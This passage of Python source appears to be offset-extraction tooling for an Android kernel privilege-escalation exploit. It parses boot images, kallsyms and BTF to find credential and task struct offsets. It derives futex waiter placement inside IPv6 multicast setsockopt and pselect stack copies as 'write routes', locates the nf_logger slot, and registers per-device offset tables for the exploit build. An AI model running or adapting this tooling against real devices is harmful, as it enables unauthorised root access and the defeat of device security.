            f"expected {MCAST_SWITCH_INDEX} for optname "
            f"{MCAST_ROUTE_OPTNAME}",
            file=sys.stderr,
        )
    return {"index": index, "copy_off": copy_off, "site_addr": site_addr}


def derive_mcast_layout(
    tool: str,
    kernel_path: Path,
    kernel: bytes,
    symbols: dict[str, set[int]],
    sorted_offsets: list[int],
    btf: Btf | None,
) -> dict[str, object]:
    """Derive the IPv6 mcast 264-byte route: the setsockopt stack copy must
    fully cover the futex waiter. Returns mcast_payload_off (waiter offset
    inside the 264-byte buffer) or raises InfeasibleError."""
    futex = derive_futex_chain(
        tool, kernel_path, symbols, sorted_offsets, btf, kernel,
    )
    sock = derive_setsockopt_chain(
        tool, kernel_path, symbols, sorted_offsets, btf, kernel,
    )
    do_text = sock["dis"]["do_ipv6_setsockopt"]
    sites = _find_mcast_copy_sites(do_text)
    if not sites:
        raise ExtractError(
            "no 264-byte stack copy in do_ipv6_setsockopt"
        )
    case = _resolve_mcast_case(kernel, do_text, sites)
    copy_abs = -sock["frame_sum"] + case["copy_off"]
    waiter_abs = int(futex["waiter_abs"])
    payload = waiter_abs - copy_abs
    waiter_size = btf.size("rt_mutex_waiter") if btf is not None else None
    if waiter_size is None:
        waiter_size = 0x58
    problems: list[str] = []
    if payload < 0 or payload + waiter_size > MCAST_COPY_LEN:
        problems.append(
            f"waiter 0x{payload:x}..0x{payload + waiter_size:x} is not "
            f"fully inside the {MCAST_COPY_LEN:#x}-byte copy"
        )
    if payload % 8:
        problems.append("waiter offset is not 8-byte aligned")
    if problems:
        raise InfeasibleError("; ".join(problems))
    return {
        "mcast_payload_off": payload,
        "copy_off": case["copy_off"],
        "copy_abs": copy_abs,
        "waiter_abs": waiter_abs,
        "waiter_size": waiter_size,
        "case_index": case["index"],
        "chain": sock["chain"],
        "frames": sock["frames"],
        "futex": futex,
    }


def unique_offset_optional(symbols: dict[str, set[int]], name: str) -> int | None:
    try:
        return unique_offset(symbols, name)
    except ExtractError:
        return None


def _materialized_address(text: str, register: str, address: int) -> bool:
    lines = text.splitlines()
    page = address & ~0xFFF
    page_off = address & 0xFFF
    for index, line in enumerate(lines):
        if not re.search(rf"\badrp\s+{register},\s*0x{page:x}\b", line, re.I):
            continue
        nearby = "\n".join(lines[index + 1:index + 4])
        if re.search(
            rf"\badd\s+{register},\s*{register},\s*#0x{page_off:x}\b",
            nearby, re.I,
        ):
            return True
    return False


def _u32(data: bytes, off: int) -> int:
    if off < 0 or off + 4 > len(data):
        raise ExtractError(f"u32 read out of range: 0x{off:x}")
    return struct.unpack_from("<I", data, off)[0]


def _u64(data: bytes, off: int) -> int:
    if off < 0 or off + 8 > len(data):
        raise ExtractError(f"u64 read out of range: 0x{off:x}")
    return struct.unpack_from("<Q", data, off)[0]


def _cstr(data: bytes, off: int, max_len: int = 4096) -> str:
    if off < 0 or off >= len(data):
        raise ExtractError(f"C string out of range: 0x{off:x}")
    end = data.find(b"\x00", off, min(len(data), off + max_len))
    if end < 0:
        raise ExtractError(f"unterminated C string at 0x{off:x}")
    return data[off:end].decode("utf-8", "replace")


def derive_nf_logger_registration(
    tool: str,
    kernel_path: Path,
    kernel: bytes,
    symbols: dict[str, set[int]],
    sorted_offsets: list[int],
    btf: Btf | None,
) -> dict[str, int]:
    """Derive loggers[0][NF_LOG_TYPE_ULOG] by disassembling
    nf_log_register/nfnetlink_log_init and closing the slot index against BTF
    nf_logger.type / NF_LOG_TYPE_ULOG / NFPROTO_UNSPEC."""
    register_text = disassemble_symbol(
        tool, kernel_path, symbols, sorted_offsets, "nf_log_register", 0x800
    )
    init_text = disassemble_symbol(
        tool, kernel_path, symbols, sorted_offsets, "nfnetlink_log_init", 0x800
    )
    logger = unique_offset(symbols, "nfulnl_logger")
    loggers = unique_offset(symbols, "loggers")
    type_off = btf.field("nf_logger", "type")
    if type_off is None or btf.direct_field_size("nf_logger", "type") != 4:
        raise ExtractError("BTF nf_logger.type is not a 4-byte enum")
    logger_type = _u32(kernel, logger + type_off)
    ulog_value = btf.enum_value("nf_log_type", "NF_LOG_TYPE_ULOG")
    max_value = btf.enum_value("nf_log_type", "NF_LOG_TYPE_MAX")
    nfproto_unspec = btf.unique_enum_member_value("NFPROTO_UNSPEC")
    if (
        ulog_value is None or max_value is None or nfproto_unspec is None
        or logger_type != ulog_value or not (0 <= ulog_value < max_value)
    ):
        raise ExtractError(
            "nfulnl_logger.type does not close with BTF NF_LOG_TYPE_ULOG: "
            f"data={logger_type}, ulog={ulog_value}, max={max_value}"
        )

    logger_aliases = set(re.findall(r"\bmov\s+(x\d+),\s*x1\b", register_text, re.I))
    if len(logger_aliases) != 1:
        raise ExtractError(
            f"nf_log_register logger alias not unique: {logger_aliases}"
        )
    logger_reg = next(iter(logger_aliases)).lower()
    type_loads = set(re.findall(
        rf"\bldr\s+w(\d+),\s*\[{logger_reg},\s*#0x{type_off:x}\]",
        register_text, re.I,
    ))
    if len(type_loads) != 1:
        raise ExtractError(
            f"nf_log_register type load not unique: {type_loads}"
        )
    type_reg = next(iter(type_loads))
    base_regs = {
        match.group(1).lower()
        for match in re.finditer(r"\badrp\s+(x\d+),", register_text, re.I)
        if _materialized_address(register_text, match.group(1).lower(), loggers)
    }
    indexed: list[tuple[str, str]] = []
    for base_reg in base_regs:
        for destination, pf_reg in re.findall(
            rf"\badd\s+(x\d+),\s*{base_reg},\s*(x\d+),\s*lsl\s*#4",
            register_text, re.I,
        ):
            if re.search(
                rf"\badd\s+{destination},\s*{destination},\s*x{type_reg},\s*lsl\s*#3",
                register_text, re.I,
            ):
                indexed.append((destination.lower(), pf_reg.lower()))
    indexed = list(dict.fromkeys(indexed))
    if len(indexed) != 1:
        raise ExtractError(
            f"nf_log_register loggers[pf][type] dataflow not unique: {indexed}"
        )
    slot_reg, _ = indexed[0]
    if not re.search(
        rf"\bstlr\s+{logger_reg},\s*\[{slot_reg}\]", register_text, re.I
    ):
        raise ExtractError("nf_log_register does not store the logger to the slot")
    if not re.search(rf"\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b",
                     register_text, re.I):
        raise ExtractError("nf_log_register type bound not closed with NF_LOG_TYPE_MAX")

    target = unique_offset(symbols, "nf_log_register")
    calls = [
        index for index, line in enumerate(init_text.splitlines())
        if re.search(rf"\bbl\s+0x{target:x}\b", line, re.I)
    ]
    if len(calls) != 1:
        raise ExtractError(f"nfnetlink_log_init -> nf_log_register calls: {len(calls)}")
    init_lines = init_text.splitlines()
    call_window = "\n".join(init_lines[max(0, calls[0] - 6):calls[0]])
    if nfproto_unspec != 0 or not re.search(r"\bmov\s+w0,\s*wzr\b", call_window, re.I):
        raise ExtractError("nfnetlink_log_init does not register with NFPROTO_UNSPEC(0)")
    if not _materialized_address(init_text, "x1", logger):
        raise ExtractError("nfnetlink_log_init x1 does not materialize nfulnl_logger")
    slot = loggers + ulog_value * 8
    return {
        "loggers": loggers,
        "nfulnl_logger": logger,
        "loggers_0_1": slot,
        "nf_log_type_ulog": ulog_value,
    }



def resolve_structs(btf: Btf | None) -> dict[str, int | None]:
    result: dict[str, int | None] = {}
    if btf is None:
        for fields in STRUCT_FIELDS.values():
            for macro in fields:
                result[macro] = None
        result["struct_page_size"] = None
        result["struct_page_compound_head"] = None
        result["struct_page_type"] = None
        result["struct_slab_cache"] = None
        result["struct_mm_struct"] = None
        return result
    for struct_name, fields in STRUCT_FIELDS.items():
        if btf.struct(struct_name) is None:
            for macro in fields:
                result[macro] = None
            continue
        for macro, field_name in fields.items():
            if isinstance(field_name, tuple):
                value = None
                for btf_name in field_name:
                    value = btf.field(struct_name, btf_name)
                    if value is not None:
                        break
                result[macro] = value
            else:
                result[macro] = btf.field(struct_name, field_name)
    for macro, struct_name in (
        ("struct_page_size", "page"),
    ):
        result[macro] = btf.size(struct_name)
    for macro, field_name in (
        ("struct_page_compound_head", "compound_head"),
        ("struct_page_type", "page_type"),
    ):
        result[macro] = btf.field("page", field_name)
    # 6.8+ splits struct slab out of struct page; 5.15 keeps the
    # slab_cache backpointer in struct page's slab union.
    result["struct_slab_cache"] = (
        btf.field("slab", "slab_cache") or btf.field("page", "slab_cache")
    )
    result["struct_mm_struct"] = btf.size("mm_struct")
    return result


def find_kallsyms(image: Path, provided: Path | None, explicit: str | None) -> tuple[Path, bool]:
    if provided is not None:
        if not provided.is_file():
            raise ExtractError(f"kallsyms file not found: {provided}")
        return provided, False
    tool = explicit or shutil.which("kallsyms-finder")
    if not tool:
        raise ExtractError("provide --kallsyms or install/pass --kallsyms-finder")
    fd, name = tempfile.mkstemp(prefix="ghostlock-kallsyms-", suffix=".txt")
    os.close(fd)
    Path(name).unlink(missing_ok=True)
    output = Path(name)
    appended = Path(f"{output}.kallsyms")
    try:
        proc = subprocess.run(
            [tool, str(image), "--output", str(output)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        if not output.exists() and appended.exists():
            appended.replace(output)
        elif appended.exists():
            appended.unlink()
        if proc.returncode or not output.exists():
            raise ExtractError(
                f"kallsyms-finder failed ({proc.returncode}): {proc.stdout[-4000:]}"
            )
        return output, True
    except Exception:
        output.unlink(missing_ok=True)
        appended.unlink(missing_ok=True)
        raise


def require_fields(values: dict[str, int | None], optional: set[str]) -> None:
    missing = [name for name, value in values.items() if value is None and name not in optional]
    if missing:
        raise ExtractError("missing required values: " + ", ".join(sorted(missing)))


KERNEL_ROOT = Path(__file__).resolve().parent.parent / "src" / "kernels"


def kernel_key(release: str | None) -> str:
    """Directory name for a kernel table: the full uname release.

    Using the exact runtime match key avoids collisions between builds that
    share a version+hash but differ in build id (e.g. -abogki... vs -ab13...).
    """
    return re.sub(r"[^A-Za-z0-9._-]", "_", release or "unknown")


def kernel_header_path(key: str) -> Path:
    return KERNEL_ROOT / key / "offsets.h"



def kernel_struct_macro(release: str | None) -> str:
    """STRUCT_OFFSETS_6_12 for 6.12+, STRUCT_OFFSETS_6_6 for 6.x,
    STRUCT_OFFSETS_5_15 for older kernels."""
    if release:
        match = re.match(r"^(\d+)\.(\d+)", release)
        if match and tuple(map(int, match.groups())) >= (6, 12):
            return "STRUCT_OFFSETS_6_12"
        if match and tuple(map(int, match.groups())) >= (6, 0):
            return "STRUCT_OFFSETS_6_6"
    return "STRUCT_OFFSETS_5_15"


def pselect_waiter_shift_for(release: str | None) -> int:
    """Fallback when --llvm-objdump is unavailable: 6.12 -> 0, 6.6 -> -2.
    Unreliable for kernels with a non-inlined do_pselect middle layer (e.g.
    some 6.6.77 builds put the waiter 12 words up, which is infeasible)."""
    return 0 if kernel_struct_macro(release) == "STRUCT_OFFSETS_6_12" else -2


# Struct fields mirrored by struct kernel_offsets in src/kernels/offsets.h;
# seccomp/configfs_buffer have no runtime overrides and are kept in
# STRUCT_FIELDS only for reference.
KERNEL_OFFSETS_FIELDS = (
    "task_prio", "task_normal_prio", "task_sched_task_group", "task_pi_lock",
    "task_pi_waiters", "task_pi_top_task", "task_pi_blocked_on", "task_pid",
    "task_tgid", "task_atomic_flags", "task_real_cred", "task_cred",
    "task_comm", "task_tasks", "task_seccomp",
    "waiter_tree", "waiter_tree_prio", "waiter_tree_deadline",
    "waiter_pi_tree", "waiter_pi_tree_prio", "waiter_pi_tree_deadline",
    "waiter_task", "waiter_lock", "waiter_wake_state", "waiter_ww_ctx",
    "cred_uid", "cred_securebits", "cred_caps", "cred_security",
    "fops_llseek", "fops_read", "fops_write", "fops_read_iter",
    "fops_write_iter", "fops_ioctl", "fops_compat_ioctl", "fops_mmap",
    "fops_open", "fops_release", "fops_splice_read", "fops_show_fdinfo",
    "struct_page_size", "struct_page_compound_head", "struct_page_type",
    "struct_slab_cache", "struct_mm_struct",
)


def struct_macro_defaults(macro: str) -> dict[str, int]:
    """Field values carried by a STRUCT_OFFSETS_* macro; single source of
    truth is src/kernels/offsets.h."""
    header = (KERNEL_ROOT / "offsets.h").read_text(
        encoding="utf-8", errors="replace"
    )
    match = re.search(
        rf"#define\s+{re.escape(macro)}\s+(.*?)(?=\n\s*\n)",
        header,
        re.S,
    )
    if not match:
        return {}
    return {
        name: int(value, 0)
        for name, value in re.findall(
            r"\.([A-Za-z0-9_]+)\s*=\s*(0x[0-9A-Fa-f]+|-?\d+)", match.group(1)
        )
    }


def render_device(
    release: str | None,
    symbols: dict[str, int | None],
    structs: dict[str, int | None],
    phys: int | None,
    pselect_shift: int,
    mcast_payload_off: int = 0,
) -> str:
    macro = kernel_struct_macro(release)
    defaults = struct_macro_defaults(macro)
    struct_values = {
        key: value for key, value in (
            (key, structs.get(key)) for key in KERNEL_OFFSETS_FIELDS
        ) if value is not None
    }
    deviations = {
        key: value for key, value in struct_values.items()
        if defaults.get(key) != value
    }
    lines = [f"/* {release} */", ""]
    lines.append("OFFSETS_ENTRY(")
    lines.append(f'    "{release}",')
    if deviations:
        # Family macro cannot express this layout; emit every known field
        # explicitly instead of mixing two initializers for the same field.
        for key in KERNEL_OFFSETS_FIELDS:
            value = struct_values.get(key)
            if value is not None:
                lines.append(f"    .{key} = 0x{value:x},")
    else:
        lines.append(f"    {macro},")
    if phys is not None:
        lines.append(f"    .kernel_phys_load = 0x{phys:x},")
    lines.append(f"    .pselect_waiter_shift = {pselect_shift},")
    if mcast_payload_off:
        lines.append(f"    .mcast_payload_off = 0x{mcast_payload_off:x},")
    for key, value in symbols.items():
        if value is None:
            continue
        lines.append(f"    .{key} = 0x{value:08x},")
    lines.append("),")
    return "\n".join(lines) + "\n"


def existing_entries() -> dict[str, dict[str, int]]:
    """Map each registered release to its {field: value} from kernel headers."""
    entries: dict[str, dict[str, int]] = {}
    for header in sorted(KERNEL_ROOT.glob("*/offsets.h")):
        text = header.read_text(encoding="utf-8", errors="replace")
        for match in re.finditer(r'OFFSETS_ENTRY\(\s*"([^"]+)"', text):
            release = match.group(1)
            fields: dict[str, int] = {}
            for fm in re.finditer(
                r"\.([A-Za-z0-9_]+)\s*=\s*(0x[0-9A-Fa-f]+|-?\d+)",
                text[match.end():],
            ):
                fields[fm.group(1)] = int(fm.group(2), 0)
            entries.setdefault(release, fields)
    return entries


def warn_existing_mismatches(
    release: str | None, symbols: dict[str, int | None]
) -> None:
    if not release:
        return
    existing = existing_entries().get(release)
    if not existing:
        return
    for key, value in symbols.items():
        if value is None:
            continue
        if key in existing and existing[key] != value:
            print(
                f"warning: {release} is already registered with .{key}="
                f"0x{existing[key]:08X}; this image extracts 0x{value:08X}",
                file=sys.stderr,
            )
            if key == "off_slide_loggers_0_1":
                print(
                    "warning:   loggers[0][1] is loggers + NF_LOG_TYPE_ULOG*8 "
                    "(disassembly + BTF verified and confirmed on device for "
                    "findn5/17pm); the older heuristic loggers + 0x10 was wrong.",
                    file=sys.stderr,
                )


def register_kernel(key: str) -> Path:
    """Add #include "<key>/offsets.h" to src/kernels/offsets.h if missing."""
    header = KERNEL_ROOT / "offsets.h"
    text = header.read_text(encoding="utf-8")
    include = f'#include "{key}/offsets.h"'
    if include in text:
        return header
    marker = re.search(r"^\s*\{\s*\.uname_r\s*=\s*NULL", text, re.MULTILINE)
    if marker is None:
        raise ExtractError(f"cannot locate NULL terminator in {header}")
    text = text[: marker.start()] + include + "\n" + text[marker.start():]
    header.write_text(text, encoding="utf-8")
    return header


def render_c(release: str | None, symbols: dict[str, int | None], structs: dict[str, int | None], phys: int | None, name: str, pselect_shift: int, mcast_payload_off: int = 0) -> str:
    lines = [f"/* Generated offsets for {release or name}. */", ""]
    lines.append("#define STRUCT_OFFSETS_EXTRACTED \\")
    task_keys = (
        "task_prio", "task_normal_prio", "task_sched_task_group", "task_pi_lock",
        "task_pi_waiters", "task_pi_top_task", "task_pi_blocked_on", "task_pid", "task_tgid",
        "task_atomic_flags", "task_real_cred", "task_cred", "task_comm",
        "task_tasks", "task_seccomp",
    )
    present = [(key, structs.get(key)) for key in task_keys if structs.get(key) is not None]
    for index, (key, value) in enumerate(present):
        suffix = " \\" if index + 1 < len(present) else ""
        if value is not None:
            lines.append(f"  .{key} = 0x{value:X},{suffix}")
    lines.append("")
    lines.append("OFFSETS_ENTRY(\"%s\"," % (release or name))
    if phys is not None:
        lines.append(f"  .kernel_phys_load=0x{phys:X},")
    lines.append(f"  .pselect_waiter_shift={pselect_shift},")
    if mcast_payload_off:
        lines.append(f"  .mcast_payload_off=0x{mcast_payload_off:X},")
    for key, value in symbols.items():
        if value is not None:
            lines.append(f"  .{key}=0x{value:08X},")
    lines.append("),")
    lines.append("")
    lines.append("/* BTF fields not stored in kernel_offsets: */")
    for key, value in structs.items():
        if not key.startswith("task_") and value is not None:
            lines.append(f"#define {key.upper()} 0x{value:X}")
    return "\n".join(lines)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=__doc__,
        epilog=(
            "examples:\n"
            "  %(prog)s boot.img --kallsyms kallsyms.txt\n"
            "  %(prog)s boot.img --xbl-config xbl_config.img --register\n"
            "  %(prog)s boot.img --llvm-objdump llvm-objdump.exe --register\n"
            "  %(prog)s boot.img --format c --out offsets.h --name device"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("image", type=Path, help="boot.img, raw arm64 Image, or gzip Image")
    parser.add_argument(
        "--kallsyms", type=Path,
        help="kallsyms text file (e.g. dumped from /proc/kallsyms); "
        "skips running kallsyms-finder",
    )
    parser.add_argument(
        "--kallsyms-finder",
        help="path to the kallsyms-finder executable; auto-detected via PATH "
        "when omitted (installed by the vmlinux-to-elf pip package)",
    )
    parser.add_argument(
        "--llvm-objdump",
        help="path to llvm-objdump; auto-derive pselect_waiter_shift and the "
        "nf_logger slide slot from disassembly (auto-detected via PATH/NDK "
        "when omitted)",
    )
    parser.add_argument(
        "--xbl-config",
        type=Path,
        help="optional XBL xbl_config.img; derive kernel physical load address from its FDT",
    )
    parser.add_argument(
        "--phys",
        type=lambda x: int(x, 0),
        help="kernel physical load address; overrides the MediaTek LZ4 "
        "default (0x80000000) and is used when there is no --xbl-config",
    )
    parser.add_argument(
        "--name", default="target",
        help="device name used in the --format c output header",
    )
    parser.add_argument(
        "--format", choices=("text", "json", "c"), default="text",
        help="output format: text (default), json, or c",
    )
    parser.add_argument(
        "--register",
        action="store_true",
        help="register the kernel table in the repo under "
        "src/kernels/<release>/offsets.h (repo format)",
    )
    parser.add_argument(
        "--allow-missing",
        action="store_true",
        help="treat every unresolved symbol as optional (emit 0)",
    )
    parser.add_argument(
        "--check-route",
        action="store_true",
        help="derive and report the futex/pselect/mcast route geometry, "
        "then exit (no table output)",
    )
    parser.add_argument(
        "--force",
        action="store_true",
        help="overwrite an existing device header that differs",
    )
    parser.add_argument("--out", type=Path, help="write output to a file instead of stdout")
    args = parser.parse_args(argv)
    if args.register and args.out is not None:
        parser.error("--register cannot be combined with --out")

    try:
        boot = BootImage.load(args.image)
        if args.xbl_config is not None:
            args.kernel_phys_load = recover_kernel_phys_load(args.xbl_config)
        elif args.phys is not None:
            args.kernel_phys_load = args.phys
        elif boot.mtk_lz4:
            args.kernel_phys_load = MTK_DEFAULT_PHYS_LOAD
            print(
                "info: MediaTek LZ4 image; assuming kernel_phys_load="
                f"0x{MTK_DEFAULT_PHYS_LOAD:x} (DRAM base; pass --phys to "
                "override)",
                file=sys.stderr,
            )
        else:
            args.kernel_phys_load = None
        btf_raw = boot.embedded_btf()
        btf = Btf(btf_raw) if btf_raw is not None else None
        if btf is None:
            print(
                "warning: embedded BTF not found; symbols come from kallsyms "
                "and struct offsets fall back to target.h defaults",
                file=sys.stderr,
            )
        kallsyms_path, owned_kallsyms = find_kallsyms(
            args.image, args.kallsyms, args.kallsyms_finder
        )
        try:
            symbols, types = parse_kallsyms(kallsyms_path)
        finally:
            if owned_kallsyms:
                kallsyms_path.unlink(missing_ok=True)
        base = unique(symbols, "_text") or unique(symbols, "_head")
        if base is None:
            raise ExtractError("_text/_head is not unique in kallsyms")
        symbol_offsets = resolve_symbols(
            symbols, types, btf, base, boot.release()
        )
        if symbol_offsets.get("off_ashmem_fops") is None:
            scanned = scan_ashmem_fops(boot.kernel, base, symbol_offsets)
            if scanned is not None:
                symbol_offsets["off_ashmem_fops"] = scanned
                print(
                    f"info: off_ashmem_fops = 0x{scanned:08x} "
                    "(file_operations pattern scan)",
                    file=sys.stderr,
                )
        derived: dict[str, int] = {}
        pselect_error: str | None = None
        mcast_error: str | None = None
        objdump = find_llvm_objdump(args.llvm_objdump)
        if objdump is None:
            print(
                "warning: llvm-objdump not found; pselect_waiter_shift and "
                "loggers_0_1 fall back to heuristics "
                "(pass --llvm-objdump to enable auto-derivation)",
                file=sys.stderr,
            )
        else:
            with tempfile.TemporaryDirectory(prefix="ghostlock-disasm-") as tmp:
                kernel_path = Path(tmp) / "kernel.bin"
                kernel_path.write_bytes(boot.kernel)
                rel_symbols, sorted_offsets = relative_symbols(symbols, base)
                pselect = None
                pselect_error = None
                try:
                    pselect = derive_pselect_layout(
                        objdump, kernel_path, rel_symbols, sorted_offsets,
                        btf, PSELECT_ROUTE_NFDS,
                    )
                except InfeasibleError as exc:
                    pselect_error = f"pselect route not feasible: {exc}"
                    print(
                        f"warning: {pselect_error}",
                        file=sys.stderr,
                    )
                except ExtractError as exc:
                    pselect_error = f"pselect_waiter_shift derivation failed: {exc}"
                    print(
                        f"warning: {pselect_error}",
                        file=sys.stderr,
                    )
                else:
                    # Linuxoid indexes waiter words from 0, ours from 2:
                    # our shift = derived value - 2.
                    derived["pselect_waiter_shift"] = (
                        pselect["PSELECT_WAITER_WORD_SHIFT"] - 2
                    )
                    frame_parts = " ".join(
                        f"{key.split('_', 1)[1]}=0x{pselect[key]:x}"
                        for key in ("frame_pselect_wrapper", "frame_pselect_dispatch",
                                    "frame_pselect_core", "frame_futex_wrapper",
                                    "frame_futex_dispatch", "frame_futex_wait")
                        if key in pselect
                    )
                    print(
                        f"info: pselect chain {pselect['chain']} frames={frame_parts} "
                        f"buffer=0x{pselect['pselect_buffer']:x} "
                        f"waiter=0x{pselect['waiter_local']:x} "
                        f"shift={derived['pselect_waiter_shift']} "
                        f"(derived {pselect['PSELECT_WAITER_WORD_SHIFT']} - 2)",
                        file=sys.stderr,
                    )
                mcast = None
                mcast_error = None
                try:
                    mcast = derive_mcast_layout(
                        objdump, kernel_path, boot.kernel,
                        rel_symbols, sorted_offsets, btf,
                    )
                except (InfeasibleError, ExtractError) as exc:
                    mcast_error = f"mcast route derivation failed: {exc}"
                    print(
                        f"warning: {mcast_error}",
                        file=sys.stderr,
                    )
                else:
                    derived["mcast_payload_off"] = mcast["mcast_payload_off"]
                    futex_info = mcast["futex"]
                    frame_parts = " ".join(
                        f"{key}=0x{value:x}"
                        for key, value in mcast["frames"].items()
                    )
                    print(
                        f"info: mcast chain {mcast['chain']} frames={frame_parts} "
                        f"copy=0x{mcast['copy_off']:x} "
                        f"waiter=0x{futex_info['waiter_local']:x} "
                        f"payload=0x{mcast['mcast_payload_off']:x} "
                        f"case={mcast['case_index']}",
                        file=sys.stderr,
                    )
                if args.check_route:
                    print("== futex chain ==")
                    try:
                        futex_info = derive_futex_chain(
                            objdump, kernel_path, rel_symbols,
                            sorted_offsets, btf, boot.kernel,
                        )
                        print(f"chain: {futex_info['chain']}")
                        print(
                            "frames: "
                            + " ".join(
                                f"{key}=0x{value:x}"
                                for key, value in futex_info["frames"].items()
                            )
                        )
                        print(
                            "waiter: sp+0x%x abs=0x%x"
                            % (
                                futex_info["waiter_local"],
                                futex_info["waiter_abs"],
                            )
                        )
                    except ExtractError as exc:
                        print(f"failed: {exc}")
                    print("== pselect route ==")
                    if pselect is not None:
                        print(
                            "feasible: shift=%d buffer=0x%x waiter=0x%x "
                            "chain=%s"
                            % (
                                pselect["PSELECT_WAITER_WORD_SHIFT"],
                                pselect["pselect_buffer"],
                                pselect["waiter_local"],
                                pselect["chain"],
                            )
                        )
                    else:
                        print(f"infeasible: {pselect_error}")
                    print("== mcast route ==")
                    if mcast is not None:
                        print(
                            "feasible: payload=0x%x copy=0x%x waiter=0x%x "
                            "case=%d chain=%s"
                            % (
                                mcast["mcast_payload_off"],
                                mcast["copy_off"],
                                mcast["waiter_abs"],
                                mcast["case_index"],
                                mcast["chain"],
                            )
                        )
                    else:
                        print(f"infeasible: {mcast_error}")
                    if pselect is None and mcast is None:
                        return 2
                    return 0
                if btf is None:
                    print(
                        "warning: no BTF; loggers_0_1 falls back to the "
                        "loggers+0x10 heuristic",
                        file=sys.stderr,
                    )
                else:
                    try:
                        logger_info = derive_nf_logger_registration(
                            objdump, kernel_path, boot.kernel,
                            rel_symbols, sorted_offsets, btf,
                        )
                    except ExtractError as exc:
                        print(
                            f"warning: loggers_0_1 derivation failed: {exc}",
                            file=sys.stderr,
                        )
                    else:
                        derived["off_slide_loggers_0_1"] = logger_info["loggers_0_1"]
                        print(
                            f"info: nf_logger loggers=0x{logger_info['loggers']:x} "
                            f"nfulnl_logger=0x{logger_info['nfulnl_logger']:x} "
                            f"ulog={logger_info['nf_log_type_ulog']} "
                            f"slot=0x{logger_info['loggers_0_1']:x}",
                            file=sys.stderr,
                        )
        pselect_shift = derived.get(
            "pselect_waiter_shift", pselect_waiter_shift_for(boot.release())
        )
        mcast_payload_off = derived.get("mcast_payload_off", 0)
        if (
            pselect_error is not None
            and pselect_error.startswith("pselect route not feasible")
            and not mcast_payload_off
        ):
            print(
                f"error: no feasible write route on this kernel: {pselect_error}",
                file=sys.stderr,
            )
            return 2
        if "pselect_waiter_shift" not in derived:
            print(
                f"warning: using heuristic pselect_waiter_shift={pselect_shift} "
                "(6.12=0, 6.6=-2); unreliable for kernels with a non-inlined "
                "do_pselect middle layer, run with --llvm-objdump to derive",
                file=sys.stderr,
            )
        if "off_slide_loggers_0_1" in derived:
            symbol_offsets["off_slide_loggers_0_1"] = derived["off_slide_loggers_0_1"]
        struct_offsets = resolve_structs(btf)
        missing = {key for key, value in symbol_offsets.items() if value is None}
        existing = existing_entries().get(boot.release() or "", {})
        tolerated = set(OPTIONAL_SYMBOLS)
        if args.allow_missing:
            tolerated.update(missing)
        for key in sorted(missing & tolerated):
            carried = existing.get(key) or 0
            symbol_offsets[key] = carried
            if carried:
                print(
                    f"warning: {key} not found in kallsyms; carried over "
                    f"0x{carried:08x} from the registered {boot.release()} entry",
                    file=sys.stderr,
                )
            else:
                print(
                    f"warning: {key} not found in kallsyms; emitted 0x00000000 "
                    "(runtime falls back to target.h default)",
                    file=sys.stderr,
                )
        require_fields(symbol_offsets, set())
        if btf is not None:
            require_fields(struct_offsets, set())
        mm_size = struct_offsets.get("struct_mm_struct")
        if mm_size is not None:
            print(
                f"info: sizeof(mm_struct)=0x{mm_size:X} "
                "(MM_STRUCT_SZ=0x500 in src/core/common.h)",
                file=sys.stderr,
            )
            if mm_size > 0x500:
                print(
                    "warning: sizeof(mm_struct) exceeds the hardcoded "
                    "MM_STRUCT_SZ slab stride",
                    file=sys.stderr,
                )
        report = {
            "release": boot.release(),
            "kimage_text_base": base,
            "kernel_phys_load": args.kernel_phys_load,
            "symbols": symbol_offsets,
            "struct_fields": struct_offsets,
            "pselect_waiter_shift": pselect_shift,
            "mcast_payload_off": mcast_payload_off,
            "btf_size": len(btf_raw) if btf_raw is not None else 0,
        }
        if args.register:
            release = boot.release()
            key = kernel_key(release)
            if release in existing_entries():
                # Same kernel already registered: keep one table.
                warn_existing_mismatches(release, symbol_offsets)
                if kernel_header_path(key).exists():
                    print(
                        f"info: {release} already registered; "
                        "no duplicate table created",
                        file=sys.stderr,
                    )
                    return 0
            output = render_device(
                release, symbol_offsets, struct_offsets,
                args.kernel_phys_load, pselect_shift, mcast_payload_off,
            )
            target = kernel_header_path(key)
            if (
                target.exists()
                and target.read_text(encoding="utf-8") != output
                and not args.force
            ):
                raise ExtractError(
                    f"{target} already exists and differs; pass --force to "
                    "overwrite"
                )
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(output, encoding="utf-8")
            print(f"wrote {target}", file=sys.stderr)
            register_kernel(key)
            warn_existing_mismatches(release, symbol_offsets)
            return 0
        if args.format == "c":
            output = render_c(
                boot.release(), symbol_offsets, struct_offsets,
                args.kernel_phys_load, args.name, pselect_shift,
                mcast_payload_off,
            )
        else:
            output = json.dumps(report, indent=2, sort_keys=True) + "\n"
        if args.out:
            args.out.write_text(output, encoding="utf-8")
        else:
            print(output, end="")
        missing = [key for key, value in {**symbol_offsets, **struct_offsets}.items() if value is None]
        if missing:
            print("missing:", ", ".join(sorted(missing)), file=sys.stderr)
        return 0
    except (OSError, ExtractError, struct.error) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
